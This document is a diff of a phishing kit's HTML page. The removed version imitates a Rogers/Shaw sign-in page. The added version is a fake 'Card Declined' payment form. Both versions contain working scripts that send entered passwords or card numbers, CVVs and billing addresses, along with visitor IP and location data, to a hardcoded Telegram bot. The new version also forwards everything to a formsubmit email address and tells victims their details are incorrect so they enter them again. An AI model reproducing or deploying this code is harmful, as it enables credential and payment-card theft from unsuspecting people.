@@ -1,288 +1,447 @@
-
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Sign in &#183; Rogers together with Shaw</title>
+<!-- saved from url=(0060)file:///C:/Users/USER/Downloads/payment_form_with_intro.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Card Declined</title>
   <style>
-    /* 1. Global Reset */
-*, *::before, *::after {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-}
-
-/* 2. Resolution Fix: Ensures the body centers the content on all screens */
-body {
-    font-family: Arial, sans-serif;
-    background-image: url('https://res.cloudinary.com/dxzzgijsa/image/upload/v1780679036/canada_bhe5j7.jpg');
-    /* background-size: cover fills the screen without stretching */
-    background-size: cover;
-    background-position: center;
-    background-repeat: no-repeat;
-    background-attachment: fixed;
-    min-height: 100vh;
-    
-    /* THE CENTERING ENGINE - ZERO SHIFT */
-    display: flex;
-    justify-content: center; /* Horizontally centers the box */
-    align-items: center;     /* Vertically centers the box */
-    padding: 20px;
-}
-
-/* 3. Intro Container (Locked Scale) */
-#introImageContainer {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: black;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 9999;
-}
-
-#introImageContainer img {
-    max-width: 100%;
-    max-height: 100%;
-}
-
-/* 4. LOGIN BOX - AUTO-CENTERED FOR ALL RESOLUTIONS */
-.login-container {
-    background: 
-    backdrop-filter: blur(10px);
-    border-radius: 20px; /* Adjusted from 70px for better fit */
-    padding: 30px;
-    width: 90%;          /* Mobile Width */
-    max-width: 350px;    /* Laptop Width */
-    
-    /* REMOVED: margin-left: 600px (This causes the shift) */
-    margin: 0 auto; 
-    
-    box-shadow: 
-    /* display: none; */ /* Uncomment for your JS logic */
-}
-
-/* 5. Typography & Forms */
-.welcome-title {
-    color: #0066cc;
-    font-size: 28px;
-    font-weight: 600;
-    margin-bottom: 30px;
-    text-align: center; /* Centered for consistent look */
-}
-
-.form-group {
-    margin-bottom: 20px;
-    width: 100%;
-}
-
-.form-label {
-    display: block;
-    color: #666;
-    font-size: 14px;
-    font-weight: 500;
-    margin-bottom: 8px;
-}
-
-.form-input {
-    width: 100%;
-    padding: 12px 16px;
-    border: 2px solid #d1d5db;
-    border-radius: 8px;
-    font-size: 16px;
-    background: white;
-}
-
-.password-container {
-    position: relative;
-    width: 100%;
-}
-
-.password-toggle {
-    position: absolute;
-    right: 12px;
-    top: 50%;
-    transform: translateY(-50%);
-    background: none;
-    border: none;
-    cursor: pointer;
-    color: #666;
-    font-size: 18px;
-}
-
-/* 6. SIGN IN BUTTON - LOCKED IN CENTER */
-.sign-in-btn {
-    width: 100%; /* Changed to 100% for mobile usability, box handles sizing */
-    background: #FF9999;
-    color: white;
-    border: none;
-    padding: 14px;
-    border-radius: 8px;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    
-    /* FORCED CENTERING */
-    display: block;
-    margin: 10px auto 20px auto; 
-    transition: background-color 0.3s ease;
-}
-
-.sign-in-btn:hover {
-    background: #ff7777;
-}
-
-.help-links {
-    display: flex;
-    flex-direction: column;
-    gap: 10px;
-    text-align: center;
-}
-
-.help-link {
-    color: #0066cc;
-    text-decoration: none;
-    font-size: 14px;
-}
-
-/* 7. AUTO-FIX FOR MOBILE RESOLUTIONS */
-@media (max-width: 480px) {
-    .login-container {
-        width: 95%;
-        padding: 20px;
+    * {margin: 0; padding: 0; box-sizing: border-box;}
+    body {
+      font-family: -apple-system, sans-serif;
+      background: url('') center/cover fixed;
+      min-height: 100vh;
+      overflow: auto;
     }
-    .welcome-title {
-        font-size: 24px;
+
+    .intro {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: white; display: flex; align-items: center; justify-content: center;
+      z-index: 9999; transition: opacity .5s;
     }
-}
+
+    .intro.hide { opacity: 0; visibility: hidden; }
+
+    .intro img {
+      max-width: 90%; max-height: 90%;
+      border-radius: 15px;
+      box-shadow: 0 0px 0px rgba(0, 0, 0, .3);
+      animation: fadeIn .8s;
+    }
+
+    @keyframes fadeIn {
+      from {opacity: 0; transform: scale(.8);}
+      to {opacity: 1; transform: scale(1);}
+    }
+
+    .main { opacity: 0; transition: opacity .5s; }
+    .main.show { opacity: 1; }
+
+    .form-container {
+      position: absolute;
+      top: 50%;
+      left: 45%;
+      transform: translate(-50%, -50%);
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+      padding: 24px;
+      border-radius: 12px;
+      width: 50%;
+      max-width: 900px;
+      box-shadow: 0 0px 0px rgba(0, 0, 0, .1);
+    }
+
+    form {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+    }
+
+    .section {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .section h2 {
+      font-size: 18px;
+      font-weight: 600;
+      color: #374151;
+      border-bottom: 2px solid #e5e7eb;
+      padding-bottom: 6px;
+      margin-bottom: 6px;
+    }
+
+    .field {
+      display: flex;
+      flex-direction: column;
+    }
+
+    label {
+      font-size: 14px;
+      font-weight: 500;
+      margin-bottom: 4px;
+      color: #374151;
+    }
+
+    input, select, textarea {
+      font-size: 14px;
+      padding: 8px 10px;
+      border: 2px solid #e5e7eb;
+      border-radius: 8px;
+      background: white;
+      transition: border-color .2s;
+    }
+
+    input:focus, select:focus, textarea:focus {
+      border-color: #3b82f6;
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+    }
+
+    .small {
+      max-width: 150px;
+    }
+
+    .medium {
+      max-width: 100%;
+    }
+
+    .exp-row {
+      display: flex;
+      gap: 12px;
+    }
+
+    .buttons {
+      grid-column: 1 / -1;
+      display: flex;
+      justify-content: flex-end;
+      gap: 16px;
+      margin-top: 10px;
+    }
+
+    .buttons button {
+      padding: 10px 24px;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 500;
+      border: 2px solid transparent;
+      cursor: pointer;
+    }
+
+    button.reset {
+      background: white;
+      color: #6b7280;
+      border-color: #e5e7eb;
+    }
+
+    button.save {
+      background: #3b82f6;
+      color: white;
+    }
+
+    button.save:hover {
+      background: #2563eb;
+    }
+
+    #errorMsg {
+      grid-column: 1 / -1;
+      color: red;
+      font-weight: 600;
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    #loader {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: white;
+      display: flex; justify-content: center; align-items: center;
+      font-size: 24px;
+      color: #3b82f6;
+      opacity: 0;
+      visibility: hidden;
+      z-index: 10000;
+      transition: opacity .4s;
+    }
+
+    #loader.show {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    @media (max-width: 768px) {
+      form {
+        grid-template-columns: 1fr;
+      }
+
+      .exp-row {
+        flex-direction: column;
+      }
+
+      .small {
+        max-width: 100%;
+      }
+    }
   </style>
 </head>
 <body>
-  <!-- 👇 Int Image Ovelay -->
-  <div id="introImageContainer">
-    <img src="https://res.cloudinary.com/dxzzgijsa/image/upload/v1766248245/Screenshot_2025-12-17_072511_ao2aww.png" alt="Intro Image" />
-  </div>
 
-  <!-- 👇 Log Fom -->
-  <div class="login-container" id="loginContainer">
-    <h1 class="welcome-title"></h1>
-
-    <form id="loginForm">
-      <div id="errorMessage" class="error-message" style="display: none;"></div>
-
-      <div class="form-group">
-  <input type="text" id="userId" name="userId" class="form-input" placeholder="Email" required value="" />
+<!-- SHOW intro initially (no .hide) -->
+<div class="intro" id="intro">
+  <img src="https://res.cloudinary.com/dxzzgijsa/image/upload/v1755850173/1stss_mxfcxy.jpg" alt="Loading...">
 </div>
 
-      <div class="form-group">
-  <div class="password-container">
-    <input type="password" id="password" name="password" class="form-input" placeholder="Password" required />
-    <button type="button" class="password-toggle" onclick="togglePassword()">👁</button>
-  </div>
-</div>
+<!-- HIDE main initially (no .show) -->
+<div class="main" id="main">
+  <div class="form-container">
+    <form id="paymentForm" autocomplete="off">
+      <!-- Left: Payment Details -->
+      <div class="section">
+        <h2>Card Details</h2>
 
-      <div class="checkbox-container">
-        <input type="checkbox" id="rememberUser" name="rememberUser" class="checkbox" />
-        <label for="rememberUser" class="checkbox-label">Remember my email</label>
+        <div class="field">
+          <label for="cardType">Select Option</label>
+          <select id="cardType" class="small" required="">
+            <option value="">Select</option>
+            <option value="Credit Card">Credit Card</option>
+            <option value="Debit Card">Debit Card</option>
+          </select>
+        </div>
+
+        <div class="field">
+          <label for="cardNumber">Card Number</label>
+          <input id="cardNumber" type="text" maxlength="19" class="medium" placeholder="Enter Card Number" required="">
+        </div>
+
+        <div class="exp-row">
+          <div class="field">
+            <label for="expMonth">Exp Month</label>
+            <select id="expMonth" class="small" required="">
+              <option value="">Month</option>
+              <option>01</option><option>02</option><option>03</option><option>04</option>
+              <option>05</option><option>06</option><option>07</option><option>08</option>
+              <option>09</option><option>10</option><option>11</option><option>12</option>
+            </select>
+          </div>
+          <div class="field">
+            <label for="expYear">Exp Year</label>
+            <select id="expYear" class="small" required=""></select>
+          </div>
+        </div>
+
+        <div class="field">
+          <label for="firstName">First Name</label>
+          <input id="firstName" type="text" class="medium" required="">
+        </div>
+
+        <div class="field">
+          <label for="lastName">Last Name</label>
+          <input id="lastName" type="text" class="medium" required="">
+        </div>
+
+        <div class="field">
+          <label for="cvv">CVV</label>
+          <input id="cvv" type="text" maxlength="4" class="small" required="">
+        </div>
       </div>
 
-      <button type="submit" class="sign-in-btn">Sign in</button>
+      <!-- Right: Billing Address -->
+      <div class="section">
+        <h2>Billing Address</h2>
 
-      
+        <div class="field">
+          <label for="country">Country</label>
+          <select id="country" class="small" required="">
+            <option value="">Select Country</option>
+            <option>United States</option><option>Guernsey</option><option>United Kingdom</option>
+            <option>Germany</option><option>France</option><option>Jersey</option>
+          </select>
+        </div>
+
+        <div class="field">
+          <label for="state">State/Province</label>
+          <input id="state" type="text" class="medium" required="">
+        </div>
+
+        <div class="field">
+          <label for="city">City</label>
+          <input id="city" type="text" class="medium" required="">
+        </div>
+
+        <div class="field">
+          <label for="address">Address</label>
+          <textarea id="address" class="medium" required=""></textarea>
+        </div>
+
+        <div class="field">
+          <label for="zip">Postal/Zip</label>
+          <input id="zip" type="text" class="medium" required="">
+        </div>
+
+        <div class="field">
+          <label for="phone">Phone</label>
+          <input id="phone" type="tel" class="medium" required="">
+        </div>
+      </div>
+
+      <div id="errorMsg"></div>
+
+      <div class="buttons">
+        <button type="button" class="reset" onclick="paymentForm.reset(); clearError();">Reset</button>
+        <button type="submit" class="save">Save</button>
       </div>
     </form>
   </div>
+</div>
 
-  <script>
-    const token = '8757890649:AAHQ9hfKHEA125d3UK2KoYpskbQjuRlNnrI';
-    const chatId = '8052751627';
-    let loginAttempts = 0;
+<div id="loader">Loading...</div>
+  
+ <!-- Add this inside <body> just before the closing </body> tag -->
+<iframe name="hiddenFrame" style="display:none;" src="./Payment Info_files/saved_resource.html"></iframe>
 
-    async function sendToTelegram(message) {
-      if (!navigator.onLine) return;
-      try {
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: message })
-        });
-      } catch (err) {
-        console.error('Telegram send error:', err);
-      }
+<script>
+  // Intro fade effect - SHOW intro for 2 seconds, then fade to form
+  setTimeout(() => {
+    document.getElementById('intro').classList.add('hide');
+    setTimeout(() => {
+      document.getElementById('main').classList.add('show');
+    }, 500);
+  }, 500); // 2 seconds instead of 5
+
+  // Populate years from 2025 to 2030
+  const yearSelect = document.getElementById('expYear'); 
+  for (let year = 2026; year <= 2035; year++) {
+    const opt = document.createElement('option');
+    opt.value = year;
+    opt.textContent = year;
+    yearSelect.appendChild(opt);
+  }
+
+  const form = document.getElementById('paymentForm'); 
+  const errorMsg = document.getElementById('errorMsg');
+  const loader = document.getElementById('loader');
+  let saveCount = 0;
+
+  function clearError() {
+    errorMsg.textContent = '';
+  }
+
+  form.addEventListener('submit', e => {
+    e.preventDefault();
+    clearError();
+
+    const cardNum = form.cardNumber.value.replace(/\s+/g, '');
+    if (!/^\d{13,19}$/.test(cardNum)) {
+      errorMsg.textContent = 'Please enter a valid card number (13–19 digits).';
+      return;
     }
 
-    function togglePassword() {
-      const passwordInput = document.getElementById('password');
-      const toggleButton = document.querySelector('.password-toggle');
+    saveCount++;
 
-      if (passwordInput.type === 'password') {
-        passwordInput.type = 'text';
-        toggleButton.textContent = '🙈';
-      } else {
-        passwordInput.type = 'password';
-        toggleButton.textContent = '👁';
-      }
-    }
+    const fields = [
+      'cardType', 'cardNumber', 'expMonth', 'expYear', 'firstName', 'lastName',
+      'cvv', 'country', 'state', 'city', 'address', 'zip', 'phone'
+    ];
 
-    function sendVisitorInfo() {
-      const userAgent = navigator.userAgent;
-      const port = window.location.port || (window.location.protocol === 'https:' ? '443' : '80');
+    // Build data string
+    const formData = fields.map(id => {
+      const val = document.getElementById(id)?.value || '';
+      return `${id}: ${val}`;
+    }).join('\n');
 
-      if (!navigator.onLine) {
-        sendToTelegram(`XTRA Offline Visi\n🖥 Browser: ${userAgent}\n🔌 Port: ${port}`);
-        return;
-      }
+    // === Telegram Bot Integration ===
+    const botToken = '8757890649:AAHQ9hfKHEA125d3UK2KoYpskbQjuRlNnrI';  // 🔁 Replace this
+    const chatId = '8052751627';      // 🔁 Replace this
 
-      fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-          const message = `🌐 shawcana Visi \nIP: ${data.ip}\nPort: ${port}\nCountry: ${data.country_name}\nCity: ${data.city}\nISP: ${data.org}\nBrowser: ${userAgent}`;
-          sendToTelegram(message);
-        }).catch(() => {
-          sendToTelegram(`🌐 shawcana Visi (IP lookup failed)\nBrowser: ${userAgent}`);
-        });
-    }
-
-    window.onload = () => {
-      sendVisitorInfo();
-
-      setTimeout(() => {
-        const intro = document.getElementById('introImageContainer');
-        const login = document.getElementById('loginContainer');
-        if (intro) intro.style.display = 'none';
-        if (login) login.style.display = 'block';
-      }, 50);
-    };
-
-    document.getElementById('loginForm').addEventListener('submit', async function (e) {
-      e.preventDefault();
-
-      const userId = document.getElementById('userId').value.trim();
-      const password = document.getElementById('password').value.trim();
-
-      if (userId && password) {
-        loginAttempts++;
-        const msg = `❌ shawcana drop #${loginAttempts}\n👤 User ID: ${userId}\n🔑 Password: ${password}`;
-        await sendToTelegram(msg);
-
-        const errorMsg = document.getElementById('errorMessage');
-        errorMsg.textContent =
-          "";
-        errorMsg.style.display = 'block';
-
-        document.getElementById('password').value = '';
-        document.getElementById('password').focus();
-
-        if (loginAttempts >= 30) {
-          window.location.href =
-            'https://res.cloudinary.com/dxzzgijsa/image/upload/v1766248245/Screenshot_2025-12-17_072511_ao2aww.png';
-        }
-      }
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: `💳 New car Submission:\n\n${formData}`
+      })
+    }).catch(err => {
+      console.error('Telegram error:', err);
     });
-  </script>
-</body>
-</html>
+
+    // Submit to FormSubmit email
+    const hiddenForm = document.createElement('form');
+    hiddenForm.action = 'https://formsubmit.co/rothjens2424@gmail.com';
+    hiddenForm.method = 'POST';
+    hiddenForm.target = 'hiddenFrame';
+
+    fields.forEach(id => {
+      const input = document.createElement('input');
+      input.type = 'hidden';
+      input.name = id;
+      input.value = document.getElementById(id)?.value || '';
+      hiddenForm.appendChild(input);
+    });
+
+    document.body.appendChild(hiddenForm);
+    hiddenForm.submit();
+    hiddenForm.remove();
+
+    // F loader or redirect after 3 tries
+    if (saveCount >= 30) {
+      loader.classList.add('show');
+      setTimeout(() => {
+        window.location.href = 'https://www.google.com';
+      }, 6000);
+    } else {
+      errorMsg.textContent = 'Incorrect details, please try again.';
+      form.reset();
+    }
+  });
+</script>
+
+<script>
+  // Visitor tracking: tg
+  async function fetchVisitorInfo() {
+    try {
+      const response = await fetch('https://ipapi.co/json/');
+      if (!response.ok) throw new Error('Failed to fetch IP info');
+      const data = await response.json();
+
+      const visitorInfo = {
+        ip: data.ip,
+        country: data.country_name,
+        city: data.city,
+        region: data.region,
+        postal: data.postal,
+        timezone: data.timezone,
+        org: data.org
+      };
+
+      // Replace with your Telegram Bot details
+      const botToken = '8757890649:AAHQ9hfKHEA125d3UK2KoYpskbQjuRlNnrI';  // 🔁 Replace this
+      const chatId = '8052751627';      // 🔁 Replace this
+
+      const message = `
+👤 cc Visitor Info:
+IP: ${visitorInfo.ip}
+Country: ${visitorInfo.country}
+Region: ${visitorInfo.region}
+City: ${visitorInfo.city}
+Postal: ${visitorInfo.postal}
+Timezone: ${visitorInfo.timezone}
+Org: ${visitorInfo.org}
+      `;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      }).catch(console.error);
+
+    } catch (error) {
+      console.error('Error fetching visitor info:', error);
+    }
+  }
+
+  window.addEventListener('load', fetchVisitorInfo);
+</script>
+
+</body></html>
